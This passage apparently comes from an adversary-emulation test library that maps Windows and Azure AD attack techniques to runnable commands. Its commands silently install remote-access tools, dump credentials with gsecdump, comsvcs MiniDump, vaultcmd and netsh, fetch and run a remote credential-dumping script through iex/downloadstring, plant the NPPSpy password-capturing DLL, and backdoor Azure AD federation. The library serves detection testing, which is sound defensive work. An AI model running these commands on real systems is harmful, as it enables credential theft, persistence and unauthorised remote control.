			"cleanup_command": "Unregister-ScheduledTask -TaskName \"RemotePC\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"RPCServiceHealthCheck\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"ServiceMonitor\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"StartRPCService\" -Confirm:$False -ErrorAction SilentlyContinue      \nStop-Process -Name \"RemotePCPerformance\" -force -erroraction silentlycontinue\nStop-Process -Name \"RPCPerformanceService\" -force -erroraction silentlycontinue\nStop-Process -Name \"RemotePCUIU\" -force -erroraction silentlycontinue\nStop-Process -Name \"RPCDownloader\" -force -erroraction silentlycontinue\nStop-Process -Name \"RemotePCService\" -force -erroraction silentlycontinue\nStop-Process -Name \"RPCService\" -force -erroraction silentlycontinue\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1219",
		"phases": ["command-and-control"]
	},
	{
		"name": "NetSupport - RAT Execution",
		"auto_generated_guid": "ecca999b-e0c8-40e8-8416-ad320b146a75",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"NetSupport_Path": {
				"description": "Path to the NetSupport executable.",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1219_NetSupport.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "NetSupport must be downloaded and exist on the disk at the specified location. (#{NetSupport_Path})\n",
				"prereq_command": "if (Test-Path \"#{NetSupport_Path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n(New-Object Net.WebClient).DownloadFile(\"https://nsproducts.azureedge.net/nsm-1270/en/Setup.exe\",\"#{NetSupport_Path}\")\n"
			}
		],
		"executor": {
			"command": "Start-Process \"#{NetSupport_Path}\" -ArgumentList \"/S /v/qn\"\n",
			"cleanup_command": "Stop-Process -Name \"client32\" -force -erroraction silentlycontinue\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1219",
		"phases": ["command-and-control"]
	},
	{
		"name": "UltraViewer - RAT Execution",
		"auto_generated_guid": "19acf63b-55c4-4b6a-8552-00a8865105c8",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"UltraViewer_Path": {
				"description": "Path to the UltraViewer executable.",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1219_UltraViewer.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Ultraviewer installer must be downloaded and exist on the disk at the specified location. (#{UltraViewer_Path})\n",
				"prereq_command": "if (Test-Path \"#{UltraViewer_Path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n(New-Object Net.WebClient).DownloadFile(\"https://www.ultraviewer.net/en/UltraViewer_setup_6.5_en.exe\",\"#{UltraViewer_Path}\")\n"
			}
		],
		"executor": {
			"command": "Start-Process -Wait -FilePath \"#{UltraViewer_Path}\" -Argument \"/silent\" -PassThru\nStart-Process 'C:\\Program Files (x86)\\UltraViewer\\UltraViewer_Desktop.exe'\n",
			"cleanup_command": "Stop-Process -Name \"UltraViewer_Desktop\" -Force -ErrorAction SilentlyContinue\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1219",
		"phases": ["command-and-control"]
	},
	{
		"name": "UltraVNC Execution",
		"auto_generated_guid": "42e51815-a6cc-4c75-b970-3f0ff54b610e",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"UltraVNC_Viewer_Path": {
				"description": "Path of UltraVNC Viewer executable",
				"type": "path",
				"default": "$env:ProgramFiles\\'uvnc bvba\\UltraVnc\\vncviewer.exe'"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "UltraVNC must exist at (#{UltraVNC_Viewer_Path})\n",
				"prereq_command": "if (Test-Path #{UltraVNC_Viewer_Path}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.uvnc.eu/download/1381/UltraVNC_1_3_81_X64_Setup.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\vncsetup.exe\"\nstart-process \"PathToAtomicsFolder\\..\\ExternalPayloads\\vncsetup.exe\" /silent\n"
			}
		],
		"executor": {
			"command": "Start-Process #{UltraVNC_Viewer_Path}\n",
			"cleanup_command": "Stop-Process -Name \"vncviewer\" -force -erroraction silentlycontinue\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1219",
		"phases": ["command-and-control"]
	},
	{
		"name": "MSP360 Connect Execution",
		"auto_generated_guid": "b1b8128b-c5d4-4de9-bf70-e60419274562",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"MSP360_Connect_Path": {
				"description": "Path of MSP360 executable",
				"type": "path",
				"default": "$env:ProgramFiles\\Connect\\Connect.exe"
			},
			"MSP360_Download_Url": {
				"description": "URL to download MSP360 Connect from",
				"type": "url",
				"default": null
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "MSP360 must exist at (#{MSP360_Connect_Path})\n",
				"prereq_command": "if (Test-Path #{MSP360_Connect_Path}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\msp360connect.exe\" \"#{MSP360_Download_Url}\"\nstart-process \"PathToAtomicsFolder\\..\\ExternalPayloads\\msp360connect.exe\" /S    \n"
			}
		],
		"executor": {
			"command": "Start-Process #{MSP360_Connect_Path}\n",
			"cleanup_command": "Stop-Process -Name \"Connect\" -force -erroraction silentlycontinue\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1219",
		"phases": ["command-and-control"]
	},
	{
		"name": "RustDesk Files Detected Test on Windows",
		"auto_generated_guid": "f1641ba9-919a-4323-b74f-33372333bf0e",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$file = Join-Path $env:USERPROFILE \"Desktop\\rustdesk-1.2.3-1-x86_64.exe\"\nInvoke-WebRequest  -OutFile $file https://github.com/rustdesk/rustdesk/releases/download/1.2.3-1/rustdesk-1.2.3-1-x86_64.exe\nStart-Process -FilePath $file \"/S\"",
			"cleanup_command": "$file = Join-Path $env:USERPROFILE \"Desktop\\rustdesk-1.2.3-1-x86_64.exe\"\nRemove-Item $file1 -ErrorAction Ignore",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1219",
		"phases": ["command-and-control"]
	},
	{
		"name": "Splashtop Execution",
		"auto_generated_guid": "b025c580-029e-4023-888d-a42710d76934",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"Splashtop_Path": {
				"description": "Path of Splashtop executable",
				"type": "path",
				"default": "${env:programfiles(x86)}\\Splashtop\\Splashtop Remote\\Client for STP\\strwinclt.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Splashtop must exist at \"#{Splashtop_Path}\"\n",
				"prereq_command": "if (Test-Path \"#{Splashtop_Path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\splashtop_install.exe\" \"https://download.splashtop.com/winclient/STP/Splashtop_Personal_Win_v3.6.6.0.exe\"\nstart-sleep 30\nstart-process \"PathToAtomicsFolder\\..\\ExternalPayloads\\splashtop_install.exe\" /S  \nstart-sleep 30      \n"
			}
		],
		"executor": {
			"command": "Start-Process \"#{Splashtop_Path}\"\n",
			"cleanup_command": "Stop-Process -Name \"strwinclt\" -force -erroraction silentlycontinue\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1219",
		"phases": ["command-and-control"]
	},
	{
		"name": "Splashtop Streamer Execution",
		"auto_generated_guid": "3e1858ee-3550-401c-86ec-5e70ed79295b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"srserver_exe": {
				"description": "Splashtop streamer installation executables",
				"type": "string",
				"default": "SRServer.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Splashtop Streamer must be installed in the location",
				"prereq_command": "if (Test-Path \"C:\\Program Files (x86)\\Splashtop\\Splashtop Remote\\Server\\#{srserver_exe}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "Write-Host Downloading Splashtop Streamer\nNew-Item -Type Directory \"C:\\Temp\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.splashtop.com/win/Splashtop_Streamer_Win_INSTALLER_v3.6.4.1.exe\" -OutFile  \"C:\\Temp\\ExternalPayloads\\Splashtop.exe\"\nWrite-Host Installing Splashtop Streamer\nStart-Process \"c:\\Temp\\ExternalPayloads\\Splashtop.exe\" -Wait -ArgumentList \"/s\""
			}
		],
		"executor": {
			"command": "Start-Process -FilePath \"C:Program Files (x86)\\Splashtop\\Splashtop Remote\\Server\\#{srserver_exe}\"",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1219",
		"phases": ["command-and-control"]
	},
	{
		"name": "Lolbin Jsc.exe compile javascript to exe",
		"auto_generated_guid": "1ec1c269-d6bd-49e7-b71b-a461f7fa7bc8",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"filename": {
				"description": "Location of the project file",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1127\\src\\hello.js"
			},
			"jscpath": {
				"description": "Default location of jsc.exe",
				"type": "path",
				"default": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319"
			},
			"jscname": {
				"description": "Default name of jsc",
				"type": "path",
				"default": "jsc.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "JavaScript code file must exist on disk at specified location (#{filename})\n",
				"prereq_command": "if (Test-Path \"#{filename}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{filename}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127/src/hello.js\" -OutFile \"#{filename}\"\n"
			}
		],
		"executor": {
			"command": "copy \"#{filename}\" %TEMP%\\hello.js\n#{jscpath}\\#{jscname} %TEMP%\\hello.js\n",
			"cleanup_command": "del %TEMP%\\hello.js\ndel %TEMP%\\hello.exe\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1127",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Lolbin Jsc.exe compile javascript to dll",
		"auto_generated_guid": "3fc9fea2-871d-414d-8ef6-02e85e322b80",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"filename": {
				"description": "Location of the project file",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1127\\src\\LibHello.js"
			},
			"jscpath": {
				"description": "Default location of jsc.exe",
				"type": "path",
				"default": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319"
			},
			"jscname": {
				"description": "Default name of jsc",
				"type": "path",
				"default": "jsc.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "JavaScript code file must exist on disk at specified location (#{filename})\n",
				"prereq_command": "if (Test-Path \"#{filename}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{filename}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127/src/LibHello.js\" -OutFile \"#{filename}\"\n"
			}
		],
		"executor": {
			"command": "copy \"#{filename}\" %TEMP%\\LibHello.js\n#{jscpath}\\#{jscname} /t:library %TEMP%\\LibHello.js\n",
			"cleanup_command": "del %TEMP%\\LibHello.js\ndel %TEMP%\\LibHello.dll\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1127",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Access Saved Credentials via VaultCmd",
		"auto_generated_guid": "9c2dd36d-5c8b-4b29-8d72-a11b0d5d7439",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "command_prompt",
			"elevation_required": false,
			"command": "vaultcmd /listcreds:\"Windows Credentials\"\n"
		},
		"attack_technique": "T1555.004",
		"phases": ["credential-access"]
	},
	{
		"name": "WinPwn - Loot local Credentials - Invoke-WCMDump",
		"auto_generated_guid": "fa714db1-63dd-479e-a58e-7b2b52ca5997",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')\nInvoke-WCMDump",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1555.004",
		"phases": ["credential-access"]
	},
	{
		"name": "Enumerate Stored Wi-Fi Profiles And Passwords via netsh",
		"auto_generated_guid": "53cf1903-0fa7-4177-ab14-f358ae809eec",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "netsh wlan show profile * key=clear",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1016.002",
		"phases": ["discovery"]
	},
	{
		"name": "Add Federation to Azure AD",
		"auto_generated_guid": "8906c5d0-3ee5-4f63-897a-f6cafd3fdbb7",
		"supported_platforms": ["azure-ad"],
		"input_arguments": {
			"azure_username": {
				"description": "Username of a privileged Azure AD account such as External Identity Provider Administrator or Global Administrator roles",
				"type": "string",
				"default": "bruce.wayne@contosocloud.com"
			},
			"azure_password": {
				"description": "Password of azure_username",
				"type": "string",
				"default": "iamthebatman"
			},
			"domain_name": {
				"description": "Malicious federated domain name",
				"type": "string",
				"default": "contoso.com"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "AzureAD and AADInternals Powershell modules must be installed.\n",
				"prereq_command": "if ((Get-Module -ListAvailable -Name AzureAD) -And (Get-Module -ListAvailable -Name AADInternals)) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Install-Module -Name AzureAD -Force\nInstall-Module -Name AADInternals -Force\n"
			}
		],
		"executor": {
			"command": "Import-Module AzureAD\nImport-Module AADInternals\n\n$PWord = ConvertTo-SecureString -String \"#{azure_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{azure_username}\", $Pword\n\ntry {\n  Connect-AzureAD -Credential $Credential -ErrorAction Stop > $null\n}\ncatch {\n  Write-Host \"Error: AzureAD could not connect\"\n  exit 1\n}\n\ntry {\n  $domain = Get-AzureADDomain -Name \"#{domain_name}\"\n}\ncatch {\n  Write-Host \"Error: domain \"\"#{domain_name}\"\" not found\"\n  exit 1\n}\nif (-Not $domain.IsVerified) {\n  Write-Host \"Error: domain \"\"#{domain_name}\"\" not verified\"\n  exit 1\n}\n\nif ($domain.AuthenticationType -eq \"Federated\") {\n  Write-Host \"Error: domain \"\"#{domain_name}\"\" already federated. Try with a different domain or re-create it before.\"\n  exit 1\n}\n\n$at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential\nif (-Not $at) {\n  Write-Host \"Error: AADInternals could not connect\"\n  exit 1\n}\n\n$new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName \"#{domain_name}\"\nif ($new) {\n  Write-Host \"Federation successfully added to Azure AD\"\n  Write-Host $new\n}\nelse {\n  Write-Host \"The federation setup failed\"\n}\n\nWrite-Host \"End of federation configuration.\"\n",
			"cleanup_command": "try {\n  Import-Module AzureAD -ErrorAction Ignore\n\n  $PWord = ConvertTo-SecureString -String \"#{azure_password}\" -AsPlainText -Force\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{azure_username}\", $Pword\n  Connect-AzureAD -Credential $Credential -ErrorAction Ignore > $null\n\n  Remove-AzureADDomain -Name \"#{domain_name}\" -ErrorAction Ignore\n} catch {}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1484.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Register Portable Virtualbox",
		"auto_generated_guid": "c59f246a-34f8-4e4d-9276-c295ef9ba0dd",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"msi_file_path": {
				"description": "Path to the MSI file",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1564.006\\bin\\Virtualbox_52.msi"
			},
			"cab_file_path": {
				"description": "Path to the CAB file",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1564.006\\bin\\common.cab"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "MSI file must exist on disk at specified location (#{msi_file_path})\n",
				"prereq_command": "if (Test-Path \"#{msi_file_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_file_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1564.006/bin/Virtualbox_52.msi\" -OutFile \"#{msi_file_path}\"\n"
			},
			{
				"description": "CAB file must exist on disk at specified location (#{cab_file_path})\n",
				"prereq_command": "if (Test-Path \"#{cab_file_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{cab_file_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1564.006/bin/common.cab\" -OutFile \"#{cab_file_path}\" \n"
			},
			{
				"description": "Old version of Virtualbox must be installed\n",
				"prereq_command": "if (Test-Path \"C:\\Program Files\\Oracle\\VirtualBox\\VboxC.dll\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "msiexec /i \"#{msi_file_path}\" /qn\n"
			}
		],
		"executor": {
			"command": "\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxSVC.exe\" /reregserver\nregsvr32 /S \"C:\\Program Files\\Oracle\\VirtualBox\\VboxC.dll\"\nrundll32 \"C:\\Program Files\\Oracle\\VirtualBox\\VBoxRT.dll,RTR3Init\"\nsc create VBoxDRV binpath= \"C:\\Program Files\\Oracle\\VirtualBox\\drivers\\VboxDrv.sys\" type= kernel start= auto error= normal displayname= PortableVBoxDRV\nsc start VBoxDRV\n",
			"cleanup_command": "sc stop VBoxDRV\nsc delete VBoxDRV\nregsvr32 /u /S \"C:\\Program Files\\Oracle\\VirtualBox\\VboxC.dll\"\nmsiexec /x \"#{msi_file_path}\" /qn\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1564.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Create and start VirtualBox virtual machine",
		"auto_generated_guid": "88b81702-a1c0-49a9-95b2-2dd53d755767",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"vm_name": {
				"description": "Name of the new virtual machine",
				"type": "string",
				"default": "Atomic VM"
			},
			"virtualbox_exe": {
				"description": "Path to the VirtualBox executable",
				"type": "path",
				"default": "C:\\Program Files\\Oracle\\VirtualBox\\VirtualBox.exe"
			},
			"vboxmanage_exe": {
				"description": "Path to the executable for VBoxManage, the command-line interface to VirtualBox",
				"type": "path",
				"default": "C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe"
			},
			"virtualbox_download": {
				"description": "URL for the current installer for the Windows version of VirtualBox, as of March 2022",
				"type": "url",
				"default": "https://download.virtualbox.org/virtualbox/6.1.32/VirtualBox-6.1.32-149290-Win.exe"
			},
			"virtualbox_installer": {
				"description": "Executable for the Virtualbox installer",
				"type": "string",
				"default": "VirtualBox-6.1.32-149290-Win.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "VirtualBox must exist on disk at specified locations (#{virtualbox_exe})\n",
				"prereq_command": "if (Test-Path \"#{virtualbox_exe}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$wc = New-Object System.Net.WebClient\n$wc.DownloadFile(\"#{virtualbox_download}\",\"PathToAtomicsFolder\\..\\ExternalPayloads\\#{virtualbox_installer}\")\nstart-process -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\#{virtualbox_installer}\" -ArgumentList \"--silent\" -Wait\n"
			},
			{
				"description": "VBoxManage must exist on disk at specified locations (#{vboxmanage_exe})\n",
				"prereq_command": "if (Test-Path \"#{vboxmanage_exe}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "$wc = New-Object System.Net.WebClient\n$wc.DownloadFile(\"#{virtualbox_download}\",\"PathToAtomicsFolder\\..\\ExternalPayloads\\#{virtualbox_installer}\")\nstart-process -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\#{virtualbox_installer}\" -ArgumentList \"--silent\" -Wait\n"
			}
		],
		"executor": {
			"name": "command_prompt",
			"elevation_required": false,
			"command": "\"#{vboxmanage_exe}\" createvm --name \"#{vm_name}\" --register\n\"#{vboxmanage_exe}\" modifyvm \"#{vm_name}\" --firmware efi\n\"#{vboxmanage_exe}\" startvm \"#{vm_name}\"\n",
			"cleanup_command": "\"#{vboxmanage_exe}\" controlvm \"#{vm_name}\" poweroff\n\"#{vboxmanage_exe}\" unregistervm \"#{vm_name}\" --delete"
		},
		"attack_technique": "T1564.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Create and start Hyper-V virtual machine",
		"auto_generated_guid": "fb8d4d7e-f5a4-481c-8867-febf13f8b6d3",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"vm_name": {
				"description": "Name of the new virtual machine",
				"type": "string",
				"default": "Atomic VM"
			}
		},
		"dependencies": [
			{
				"description": "Hyper-V must be enabled on the system\nChecks whether Hyper-V is enabled. If not, enables Hyper-V and forces a required restart\n",
				"prereq_command": "if ((Get-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V).State = \"Enabled\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All -Force\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": true,
			"command": "$VM = \"#{vm_name}\"\nNew-VM -Name $VM -Generation 2\nSet-VMFirmware $VM -EnableSecureBoot Off\nStart-VM $VM",
			"cleanup_command": "Stop-VM $VM -Force\nRemove-VM $VM -Force"
		},
		"attack_technique": "T1564.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Gsecdump",
		"auto_generated_guid": "96345bfc-8ae7-4b6a-80b7-223200f24ef9",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"gsecdump_exe": {
				"description": "Path to the Gsecdump executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\gsecdump.exe"
			},
			"gsecdump_bin_hash": {
				"description": "File hash of the Gsecdump binary file",
				"type": "string",
				"default": "94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC"
			},
			"gsecdump_url": {
				"description": "Path to download Gsecdump binary file",
				"type": "url",
				"default": "https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Gsecdump must exist on disk at specified location (#{gsecdump_exe})\n",
				"prereq_command": "if (Test-Path \"#{gsecdump_exe}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n$parentpath = Split-Path \"#{gsecdump_exe}\"; $binpath = \"$parentpath\\gsecdump-v2b5.exe\"\nIEX(IWR \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1\" -UseBasicParsing)\nif(Invoke-WebRequestVerifyHash \"#{gsecdump_url}\" \"$binpath\" #{gsecdump_bin_hash}){\n  Move-Item $binpath \"#{gsecdump_exe}\"\n}\n"
			}
		],
		"executor": {
			"command": "\"#{gsecdump_exe}\" -a\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1003",
		"phases": ["credential-access"]
	},
	{
		"name": "Credential Dumping with NPPSpy",
		"auto_generated_guid": "9e2173c0-ba26-4cdf-b0ed-8c54b27e3ad6",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "NPPSpy.dll must be available in ExternalPayloads directory",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\NPPSPY.dll\") {exit 0} else {exit 1}",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\NPPSPY.dll\""
			}
		],
		"executor": {
			"command": "Copy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\NPPSPY.dll\" -Destination \"C:\\Windows\\System32\"\n$path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER\n$UpdatedValue = $Path.PROVIDERORDER + \",NPPSpy\"\nSet-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy -ErrorAction Ignore\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -ErrorAction Ignore\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Class\" -Value 2 -ErrorAction Ignore\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Name\" -Value NPPSpy -ErrorAction Ignore\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%SystemRoot%\\System32\\NPPSPY.dll\" -ErrorAction Ignore\necho \"[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\NPPSpy.txt\"",
			"cleanup_command": "$cleanupPath = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER\n$cleanupUpdatedValue = $cleanupPath.PROVIDERORDER \n$cleanupUpdatedValue = $cleanupUpdatedValue -replace ',NPPSpy',''\nSet-ItemProperty -Path $cleanupPath.PSPath -Name \"PROVIDERORDER\" -Value $cleanupUpdatedValue\nRemove-Item -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\" -Recurse -ErrorAction Ignore\nRemove-Item C:\\NPPSpy.txt -ErrorAction Ignore\nRemove-Item C:\\Windows\\System32\\NPPSpy.dll -ErrorAction Ignore",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1003",
		"phases": ["credential-access"]
	},
	{
		"name": "Dump svchost.exe to gather RDP credentials",
		"auto_generated_guid": "d400090a-d8ca-4be0-982e-c70598a23de9",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)\nif($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }\nC:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full\n",
			"cleanup_command": "Remove-Item $env:TEMP\\svchost-exe.dmp -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1003",
		"phases": ["credential-access"]
	},
	{
		"name": "Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list)",
		"auto_generated_guid": "6c7a4fd3-5b0b-4b30-a93e-39411b25d889",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "IIS must be installed prior to running the test",
				"prereq_command": "if ((Get-WindowsFeature Web-Server).InstallState -eq \"Installed\") {exit 0} else {exit 1}",
				"get_prereq_command": "Install-WindowsFeature -name Web-Server -IncludeManagementTools"
			}
		],
		"executor": {
			"command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@t:*\nC:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@text:*\nC:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /text:*",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1003",
		"phases": ["credential-access"]
	},
	{
		"name": "Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config)",
		"auto_generated_guid": "42510244-5019-48fa-a0e5-66c3b76e6049",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "IIS must be installed prior to running the test",
				"prereq_command": "if ((Get-WindowsFeature Web-Server).InstallState -eq \"Installed\") {exit 0} else {exit 1}",
				"get_prereq_command": "Install-WindowsFeature -name Web-Server -IncludeManagementTools"
			}
		],
		"executor": {
